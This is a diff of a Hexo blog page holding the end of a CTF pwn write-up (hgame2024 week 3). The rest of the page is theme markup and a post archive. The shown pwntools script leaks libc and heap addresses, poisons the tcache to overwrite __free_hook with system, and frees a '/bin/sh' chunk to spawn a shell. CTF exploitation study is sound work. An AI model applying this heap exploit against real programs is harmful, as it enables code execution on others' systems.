+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libc_base="</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">)</span>
+free_hook<span class="token operator">=</span> base <span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
+system<span class="token operator">=</span>base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+
+mp_offset<span class="token operator">=</span><span class="token number">0x7fb195cdc280</span><span class="token operator">-</span><span class="token number">0x7fb195af9000</span>
+mp_<span class="token operator">=</span>base<span class="token operator">+</span>mp_offset
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"mp_="</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>mp_<span class="token punctuation">)</span><span class="token punctuation">)</span>
+target<span class="token operator">=</span>mp_<span class="token operator">+</span><span class="token number">0x50</span>
+
+
+add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0x500</span><span class="token punctuation">)</span> <span class="token comment">#take out 1</span>
+
+add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x600</span><span class="token punctuation">)</span> <span class="token comment">#chunk1</span>
+add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x500</span><span class="token punctuation">)</span> 
+add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x5f0</span><span class="token punctuation">)</span> <span class="token comment">#chunk2</span>
+add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x500</span><span class="token punctuation">)</span>
+
+delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0x900</span><span class="token punctuation">)</span> <span class="token comment"># 5 in large bin</span>
+
+delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
+
+fd<span class="token operator">=</span>u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>target<span class="token operator">-</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>
+
+add<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">0x900</span><span class="token punctuation">)</span>
+<span class="token comment"># mp_ -> tcache_size = 7 addr</span>
+
+edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span>
+show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span>
+heap_base<span class="token operator">=</span>u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x290</span>
+edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>out<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span>
+success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"heap_base -></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+
+<span class="token comment"># g(p)</span>
+add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x500</span><span class="token punctuation">)</span>
+delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+<span class="token comment"># tcache poison</span>
+edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">9</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x500</span><span class="token punctuation">)</span>
+edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>
+edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
+delete<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
+
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+	  <div class="article-footer-copyright">
+	Ciallo～(∠・ω< )⌒★
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
     
-        <div class="license-wrapper">
-            <p>Author：<a href="https://nyyyddddn.github.io">nyyyddddn</a>
-            <p>Link：<a href="https://nyyyddddn.github.io/2024/02/27/hgame2024week3-wp/">https://nyyyddddn.github.io/2024/02/27/hgame2024week3-wp/</a>
-            <p>Publish date：<a href="https://nyyyddddn.github.io/2024/02/27/hgame2024week3-wp/">February 27th 2024, 5:21:04 pm</a>
-            <p>Update date：<a href="https://nyyyddddn.github.io/2024/02/27/hgame2024week3-wp/">February 27th 2024, 5:23:07 pm</a>
-            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
-        </div>
     
-    <!-- paginator -->
-    <ul class="post-paginator">
-        <li class="next">
-            
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2024/03/04/osu-gaming-CTF-2024/" title="osu!gaming_CTF_2024">
-                    <div class="nextTitle">osu!gaming_CTF_2024</div>
-                </a>
-            
-        </li>
-        <li class="previous">
-            
-                <div class="prevSlogan">Previous Post</div>
-                <a href="/2024/02/25/sictfr3-pwn-wp/" title="sictfr3_pwn_wp">
-                    <div class="prevTitle">sictfr3_pwn_wp</div>
-                </a>
-            
-        </li>
+    <a href="/2024/03/04/osu-gaming-CTF-2024/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/02/25/sictfr3-pwn-wp/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-02-27 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/ctf-writeup/">ctf writeup<span>51</span></a></li>
     </ul>
-    <!-- comment -->
-    
-        <div class="post-comment">
-            <!-- 来必力 City 版安装代码 -->
+	</div>
+		
 
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
 
-            
+		
 
-            
+	</div>
+	
+		
 
-            
+</div><!-- row -->
 
-            <!-- utteranc评论 -->
-
-
-            <!-- partial('_partial/comment/changyan') -->
-            <!--PC版-->
-
-
-            
-            
-
-            
-
-        </div>
-    
-    <!-- timeliness note -->
-    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
-    
-    <!-- Mathjax -->
-    
-</main>
-
-                <!-- profile -->
-                
-            </div>
-            <footer class="footer footer-unloaded">
-    <!-- social  -->
-    
-        <div class="social">
-            
-    
-        
-            
-                <a href="mailto:1959759892@qq.com" class="iconfont-archer email" title=email ></a>
-            
-        
-    
-        
-            
-                <a href="//github.com/nyyyddddn" class="iconfont-archer github" target="_blank" title=github></a>
-            
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-
-
-        </div>
-    
-    <!-- powered by Hexo  -->
-    <div class="copyright">
-        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
-    </div>
-    <!-- website approve for Chinese user -->
-    
-    <!-- 不蒜子  -->
-    
-        <div class="busuanzi-container">
-            
-             
-                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
-            
-        </div>
-    	
-</footer>
-
-        </div>
-        <!-- toc -->
-        
-            <div class="toc-wrapper toc-wrapper-loding" style=
+<!--
+ -->
 
 
 
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 nyyyddddn's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
 
 
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
 
 
-    top:50vh;
-
->
-                <div class="toc-catalog">
-                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
-                </div>
-                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-number">1.</span> <span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%A0%E6%BB%A1%E4%BA%86-%E9%82%A3%E6%88%91%E5%B0%B1%E6%BC%AB%E5%87%BA%E6%9D%A5%E4%BA%86-%E8%A1%A5"><span class="toc-number">1.1.</span> <span class="toc-text">你满了,那我就漫出来了![补]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Elden-Ring-%E2%85%A2-%E8%A1%A5"><span class="toc-number">1.2.</span> <span class="toc-text">Elden Ring Ⅲ[补]</span></a></li></ol></li></ol>
-            </div>
-        
-        <!-- sidebar -->
-        <div class="sidebar sidebar-hide">
-    <ul class="sidebar-tabs sidebar-tabs-active-0">
-        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
-        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
-        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
-    </ul>
-    <div class="sidebar-content sidebar-content-show-archive">
-        <div class="sidebar-panel-archives">
-    <!-- 在 ejs 中将 archive 按照时间排序 -->
-    
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-    
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-    
-    
-    
-    
-    <div class="total-and-search">
-        <div class="total-archive">
-        Total : 64
-        </div>
-        <!-- search  -->
-        
-    </div>
-    
-    <div class="post-archive">
-    
-        
-            
-            
-            <div class="archive-year"> 2025 </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/29</span>
-            <a class="archive-post-title" href="/2025/04/29/hackergame2024%E5%A4%8D%E7%8E%B0/">hackergame2024复现</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/09</span>
-            <a class="archive-post-title" href="/2025/04/09/Squ1rrelCTF/">Squ1rrelCTF</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/27</span>
-            <a class="archive-post-title" href="/2025/01/27/KnightCTF/">KnightCTF</a>
-        </li>
-    
-        
-            
-            
-                
-                </ul>
-            
-            <div class="archive-year"> 2024 </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">10/23</span>
-            <a class="archive-post-title" href="/2024/10/23/geekgame2024/">geekgame2024</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/07</span>
-            <a class="archive-post-title" href="/2024/09/07/byuctf-iot/">byuctf_iot</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/02</span>
-            <a class="archive-post-title" href="/2024/09/02/gdbjail/">gdbjail</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/01</span>
-            <a class="archive-post-title" href="/2024/08/01/ImaginaryCTF/">ImaginaryCTF</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">07/22</span>
-            <a class="archive-post-title" href="/2024/07/22/dasctf2024-summer-challenge/">dasctf2024_summer_challenge</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/30</span>
-            <a class="archive-post-title" href="/2024/06/30/d3ctf-pwnshell%E5%A4%8D%E7%8E%B0/">d3ctf_pwnshell复现</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/04</span>
-            <a class="archive-post-title" href="/2024/06/04/litctf2024-pwn/">litctf2024_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/27</span>
-            <a class="archive-post-title" href="/2024/05/27/DragonKnightCTF-pwn/">DragonKnightCTF_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/22</span>
-            <a class="archive-post-title" href="/2024/05/22/ciscn-pwn/">ciscn_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/15</span>
-            <a class="archive-post-title" href="/2024/05/15/hnctf-pwn/">hnctf_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/14</span>
-            <a class="archive-post-title" href="/2024/05/14/miniL2024-pwn/">miniL2024_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/28</span>
-            <a class="archive-post-title" href="/2024/04/28/hznuctf/">hznuctf</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/24</span>
-            <a class="archive-post-title" href="/2024/04/24/geekcon/">geekcon</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/15</span>
-            <a class="archive-post-title" href="/2024/03/15/CyberApocalypse-2024-Hacker-Royale-wp/">CyberApocalypse_2024_Hacker_Royale_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/27</span>
-            <a class="archive-post-title" href="/2024/02/27/hgame2024week3-wp/">hgame2024week3_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/14</span>
-            <a class="archive-post-title" href="/2024/02/14/hgame2024week2-pwn-wp/">hgame2024week2_pwn_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/11</span>
-            <a class="archive-post-title" href="/2024/02/11/0xl4ugh-pwn/">0xl4ugh_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/07</span>
-            <a class="archive-post-title" href="/2024/02/07/hgame2024week1-wp/">hgame2024week1_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/06</span>
-            <a class="archive-post-title" href="/2024/02/06/beginctf2024-wp/">beginctf2024_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/02</span>
-            <a class="archive-post-title" href="/2024/01/02/cbctf/">cbctf</a>
-        </li>
-    
-        
-            
-            
-                
-                </ul>
-            
-            <div class="archive-year"> 2023 </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/28</span>
-            <a class="archive-post-title" href="/2023/12/28/GeekChallenge2023/">GeekChallenge2023</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/28</span>
-            <a class="archive-post-title" href="/2023/12/28/hackergame2023/">Hackergame2023</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">11/29</span>
-            <a class="archive-post-title" href="/2023/11/29/isctf/">isctf</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">11/05</span>
-            <a class="archive-post-title" href="/2023/11/05/newstar-week2/">newstar_week2</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">10/21</span>
-            <a class="archive-post-title" href="/2023/10/21/0xgame/">0xgame</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/26</span>
-            <a class="archive-post-title" href="/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/">exp本地不通远程通的问题</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span>
-            <a class="archive-post-title" href="/2023/09/18/cdn%E7%BB%95%E8%BF%87%E5%A4%A7%E5%85%A8tips%E6%80%9D%E8%B7%AF/">cdn绕过大全tips思路</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span>
-            <a class="archive-post-title" href="/2023/09/18/cnss2023/">cnss2023</a>
-        </li>
-    
-        
-            
-            
-                
-                </ul>
-            
-            <div class="archive-year"> Invalid date </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span>
-            <a class="archive-post-title" href="/2023/09/18/hello-world/">Hello World</a>
-        </li>
-    
-        
-            
-            
-                
-                </ul>
-            
-            <div class="archive-year"> 2025 </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/03</span>
-            <a class="archive-post-title" href="/2025/05/03/rust%E5%85%A5%E9%97%A8-%E6%95%B0%E6%8D%AE%E6%89%80%E6%9C%89%E6%9D%83%E4%B8%8E%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E7%AE%A1%E7%90%86/">rust入门_数据所有权与生命周期管理</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/27</span>
-            <a class="archive-post-title" href="/2025/01/27/x3ctf/">x3ctf</a>
-        </li>
-    
-        
-            
-            
-                
-                </ul>
-            
-            <div class="archive-year"> 2024 </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/04</span>
-            <a class="archive-post-title" href="/2024/09/04/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024pwn/">羊城杯2024pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/31</span>
-            <a class="archive-post-title" href="/2024/08/31/nss3rd%E5%87%BA%E9%A2%98-Iterator-Trap%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/">nss3rd出题_Iterator_Trap解题思路</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/31</span>
-            <a class="archive-post-title" href="/2024/08/31/srctf-pwn%E5%87%BA%E9%A2%98/">srctf_pwn出题</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/31</span>
-            <a class="archive-post-title" href="/2024/08/31/xyctf/">xyctf</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/25</span>
-            <a class="archive-post-title" href="/2024/08/25/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/">羊城杯2023部分题目复现</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/22</span>
-            <a class="archive-post-title" href="/2024/08/22/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A81/">奇奇怪怪格式化字符串漏洞的利用1</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/08</span>
-            <a class="archive-post-title" href="/2024/08/08/tfcctf2024/">tfcctf2024</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">07/15</span>
-            <a class="archive-post-title" href="/2024/07/15/wkctf-pwn/">wkctf_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/25</span>
-            <a class="archive-post-title" href="/2024/06/25/xctf-ggbord%E5%A4%8D%E7%8E%B0/">xctf_ggbord复现</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/19</span>
-            <a class="archive-post-title" href="/2024/06/19/vsctf-pwn/">vsctf_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/30</span>
-            <a class="archive-post-title" href="/2024/05/30/xctf-BuggyAllocator%E5%A4%8D%E7%8E%B0/">xctf_BuggyAllocator复现</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/23</span>
-            <a class="archive-post-title" href="/2024/05/23/xv6-and-unix-utilities/">xv6_and_unix_utilities</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/28</span>
-            <a class="archive-post-title" href="/2024/04/28/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bpwn%E6%96%B9%E5%90%91wp/">中国海洋大学信息安全竞赛pwn方向wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/31</span>
-            <a class="archive-post-title" href="/2024/03/31/%E5%B0%9D%E8%AF%95%E7%BC%96%E8%AF%91kernel%E5%92%8C%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/">尝试编译kernel和文件系统</a>
-        </li>
-    
-        
